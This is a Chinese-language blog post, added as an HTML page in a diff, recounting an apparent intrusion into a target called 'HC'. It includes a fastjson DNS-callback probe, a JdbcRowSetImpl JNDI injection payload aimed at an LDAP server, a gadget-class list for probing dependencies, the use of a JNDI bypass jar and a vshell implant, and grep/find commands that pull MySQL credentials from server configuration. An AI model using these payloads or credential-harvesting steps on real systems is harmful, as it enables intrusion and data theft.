@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sp4rks3">
+  <meta name="keywords" content="博客">
+  
+    <meta name="description" content="前言也是断断续续用了一些时间才拿下，队内浩然师傅很给力的嗷。 信息收集项目前期的信息收集就是一个非常繁琐的过程，体力活，很痛苦。不过陆续还是通过icon hash、title、子域名、搜索到了很多目标资产。   我的想法就是直接fscan梭哈，能拿下脆弱资产就是最好的。 当然不出所料，没有收获，现在安全都是做的很好。大部分服务器都只开443、80。只能从web端入手。 也找到了一些后台，试过弱口令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次HC上线全过程">
+<meta property="og:url" content="https://sp4rks3.github.io/2025/03/21/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/%E8%AE%B0%E4%B8%80%E6%AC%A1HC%E4%B8%8A%E7%BA%BF%E5%85%A8%E8%BF%87%E7%A8%8B/index.html">
+<meta property="og:site_name" content="Sp4rks3&#39;s Blog">
+<meta property="og:description" content="前言也是断断续续用了一些时间才拿下，队内浩然师傅很给力的嗷。 信息收集项目前期的信息收集就是一个非常繁琐的过程，体力活，很痛苦。不过陆续还是通过icon hash、title、子域名、搜索到了很多目标资产。   我的想法就是直接fscan梭哈，能拿下脆弱资产就是最好的。 当然不出所料，没有收获，现在安全都是做的很好。大部分服务器都只开443、80。只能从web端入手。 也找到了一些后台，试过弱口令">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250321122222511.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250321122335545.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317200850374.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317202345038.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317210704265.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317220952978.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317203348613.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317205637229.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317205424811.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317234919565.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317235024674.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250317232823422.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250318161049699.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250318161129980.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250321123621249.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250321141307095.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/03/image-20250321141221167.png">
+<meta property="article:published_time" content="2025-03-21T06:30:45.261Z">
+<meta property="article:modified_time" content="2025-03-21T06:38:36.919Z">
+<meta property="article:author" content="Sp4rks3">
+<meta property="article:tag" content="HC测试">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://image.sp4rks.xyz/2025/03/image-20250321122222511.png">
+  
+  
+  
+  <title>记一次HC上线全过程 - Sp4rks3&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sp4rks3.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sp4rks3&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="记一次HC上线全过程"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-21 14:30" pubdate>
+          2025年3月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">记一次HC上线全过程</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是断断续续用了一些时间才拿下，队内浩然师傅很给力的嗷。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>项目前期的信息收集就是一个非常繁琐的过程，体力活，很痛苦。不过陆续还是通过icon hash、title、子域名、搜索到了很多目标资产。</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250321122222511.png" srcset="/img/loading.gif" lazyload alt="image-20250321122222511"></p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250321122335545.png" srcset="/img/loading.gif" lazyload alt="image-20250321122335545"></p>
+<p>我的想法就是直接fscan梭哈，能拿下脆弱资产就是最好的。</p>
+<p>当然不出所料，没有收获，现在安全都是做的很好。大部分服务器都只开443、80。只能从web端入手。</p>
+<p>也找到了一些后台，试过弱口令、文件上传，只能说很好，安全意识很棒奥，还是没有收获。</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317200850374.png" srcset="/img/loading.gif" lazyload alt="image-20250317200850374"></p>
+<p>持续了几天，除了信息收集稍微有进展，其他地方都推进不动，已经不知道从哪里入手了，突然浩然师傅目录扫描，看到主机上还有别的web站。另外提一句，打了几次HC，都有一定经验了，如果是APP的后台管理，那基本上会检测UA头，如果是WEB站，基本上会看IP地址，所以有时候多换几个IP试试(我这里就是我一直是美国节点，返回403，浩然师傅香港节点能直接访问)</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317202345038.png" srcset="/img/loading.gif" lazyload alt="image-20250317202345038"></p>
+<p>反正都得试试，于是迎来了这次项目得转机</p>
+<h1 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h1><p>访问过程中有很多的JSON数据</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317210704265.png" srcset="/img/loading.gif" lazyload alt="image-20250317210704265"></p>
+<p>这不职业敏感性，想到fastjson或者jackson嘛</p>
+<p>去掉一个括号，报错了，有戏</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317220952978.png" srcset="/img/loading.gif" lazyload alt="image-20250317220952978"></p>
+<p>探测一下出网情况，出网，多半有了！(其实DNS能出网，就认为存在fastjson漏洞，这是不正确的，这里是我感觉，有时候感觉很重要)</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;tv4jks.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317203348613.png" srcset="/img/loading.gif" lazyload alt="image-20250317203348613"></p>
+<p>用报错回显看看fastjson版本</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317205637229.png" srcset="/img/loading.gif" lazyload alt="image-20250317205637229"></p>
+<p>没版本回显。后续通过<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md">https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md</a> 的poc，确定了版本应该是&lt;&#x3D;1.2.47</p>
+<p>由于确定了fastjson小于1.2.47，直接用通用的payload打一波</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://10.30.1.214:1389/my9azs&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>JNDI工具用的 <a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus?tab=readme-ov-file">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus?tab=readme-ov-file</a></p>
+<p>没成功，这里其实就有点懵逼了，种种的不确定，不确定fastjson版本是不是&lt;&#x3D;1.2.47，于是选择探测依赖通过别的方式打。（当时没有及时想到JDK191之后对JNDI的限制，走了很多弯路）</p>
+<h1 id="FastJson引入依赖检测"><a href="#FastJson引入依赖检测" class="headerlink" title="FastJson引入依赖检测"></a>FastJson引入依赖检测</h1><p>测试比较通用的方法：利用Character转换报错</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>  <span class="hljs-string">&quot;x&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>: <span class="hljs-string">&quot;java.lang.Character&quot;</span>&#123;<br>  <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>  <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span><br>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>还是没有回显</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317205424811.png" srcset="/img/loading.gif" lazyload alt="image-20250317205424811"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.bind</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.RequestMapping</span>  <span class="hljs-comment">//SpringBoot</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.startup</span><span class="hljs-selector-class">.Tomcat</span>  <span class="hljs-comment">//Tomcat</span><br>groovy<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.GroovyShell</span>  <span class="hljs-comment">//Groovy - 1.2.80</span><br>com<span class="hljs-selector-class">.mchange</span><span class="hljs-selector-class">.v2</span><span class="hljs-selector-class">.c3p0</span><span class="hljs-selector-class">.DataSources</span>  <span class="hljs-comment">//C3P0</span><br>com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.jdbc</span><span class="hljs-selector-class">.Buffer</span>  <span class="hljs-comment">//mysql-jdbc-5</span><br>com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.api</span><span class="hljs-selector-class">.authentication</span><span class="hljs-selector-class">.AuthenticationProvider</span>  <span class="hljs-comment">//mysql-connect-6</span><br>com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.AuthenticationProvider</span> <span class="hljs-comment">//mysql-connect-8</span><br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.cs</span><span class="hljs-selector-class">.GBK</span>  <span class="hljs-comment">//JDK8</span><br>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.http</span><span class="hljs-selector-class">.HttpClient</span>  <span class="hljs-comment">//JDK11</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.type</span><span class="hljs-selector-class">.Alias</span>  <span class="hljs-comment">//Mybatis</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.BasicDataSource</span>  <span class="hljs-comment">//tomcat-dbcp-7-BCEL</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSource</span> <span class="hljs-comment">//tomcat-dbcp-8及以后-BCEL</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Charsets</span>       <span class="hljs-comment">// 存在commons-io,但不确定版本</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.file</span><span class="hljs-selector-class">.Counters</span>  <span class="hljs-comment">//commons-io-2.7-2.8</span><br>org<span class="hljs-selector-class">.aspectj</span><span class="hljs-selector-class">.ajde</span><span class="hljs-selector-class">.Ajde</span>  <span class="hljs-comment">//aspectjtools</span><br></code></pre></td></tr></table></figure>
+
+<p>于是准备盲打一波了。</p>
+<p>通过计划任务，C3P0、BCEL都没有打成功，其实这时候项目就已经停滞不前了。正值周末，也没兴趣再看了。</p>
+<p>周一上班又开始看这个项目，不一会浩然师傅发来了这篇<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1245-jdk8u342/write-up.md">WP</a>，用里面的JNDIBypass.jar，果然直接上线了。</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317234919565.png" srcset="/img/loading.gif" lazyload alt="image-20250317234919565"></p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317235024674.png" srcset="/img/loading.gif" lazyload alt="image-20250317235024674"></p>
+<p>后续上了vshell看java版本果然是大于191</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250317232823422.png" srcset="/img/loading.gif" lazyload alt="image-20250317232823422"></p>
+<h1 id="扩大成果"><a href="#扩大成果" class="headerlink" title="扩大成果"></a>扩大成果</h1><p>前期我们信息收集的时候已经发现他是tomcat搭建的所以直接找一下tomcat关于JDBC的配置文件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -ri <span class="hljs-string">&quot;jdbc:mysql&quot;</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果是Springboot框架就找spring的配置文件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">find / -name *<span class="hljs-string">.yml</span> <span class="hljs-string">.properties</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250318161049699.png" srcset="/img/loading.gif" lazyload alt="image-20250318161049699"></p>
+<p>找到了mysql的账号密码，直接vshell代理出来就了</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250318161129980.png" srcset="/img/loading.gif" lazyload alt="image-20250318161129980"></p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250321123621249.png" srcset="/img/loading.gif" lazyload alt="image-20250321123621249"></p>
+<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>后面我就没看了，第二天看到浩然师傅又拿下几个站。</p>
+<p>众所周知，JAVA在8u191之后对JNDI注入对远程加载类有了严格的限制，目前公开常用的方法是通过Tomcat的<code>org.apache.naming.factory.BeanFactory</code> 工厂类去调用 <code>javax.el.ELProcessor#eval</code>方法或<code>groovy.lang.GroovyShell#evaluate</code>方法。另外就是LDAP本身可以存储对象的信息，可以利用LDAP返回一个恶意的序列化对象。</p>
+<p>我们来看看这个<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RW5Cvg1KtLuIrQ5LZPoRFQ?pwd=aij8">JNDIBypass.jar</a> 插件是怎么绕过高版本JNDI注入的？</p>
+<p>主要的逻辑在start方法，配置了一个LDAP服务器，添加了自定义拦截器OperationInterceptor，拦截器调用了FastJson1.gen()</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250321141307095.png" srcset="/img/loading.gif" lazyload alt="image-20250321141307095"></p>
+<p>进来可以看到是标准的Fastjson原生反序列化Gadget</p>
+<p><img src="https://image.sp4rks.xyz/2025/03/image-20250321141221167.png" srcset="/img/loading.gif" lazyload alt="image-20250321141221167"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1245-jdk8u342/write-up.md">write-up.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md">Fastjson全版本检测及利用-Poc.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_71692682/article/details/125814861">fastjson反序列化漏洞区分版本号的方法总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lKyQtVUOoJyobww6X8IY9A">渗透实战|记一次简单的Docker逃逸+反编译jar接管云主机</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HC%E6%B5%8B%E8%AF%95/" class="print-no-link">#HC测试</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>记一次HC上线全过程</div>
+      <div>https://sp4rks3.github.io/2025/03/21/渗透实战/记一次HC上线全过程/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sp4rks3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/17/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/JEECMS%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="JEECMS流量分析">
+                        <span class="hidden-mobile">JEECMS流量分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Sp4rks3/Sp4rks3.github.io","repo-id":"R_kgDOL2R4Xw","category":"Announcements","category-id":"DIC_kwDOL2R4X84ChqtT","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
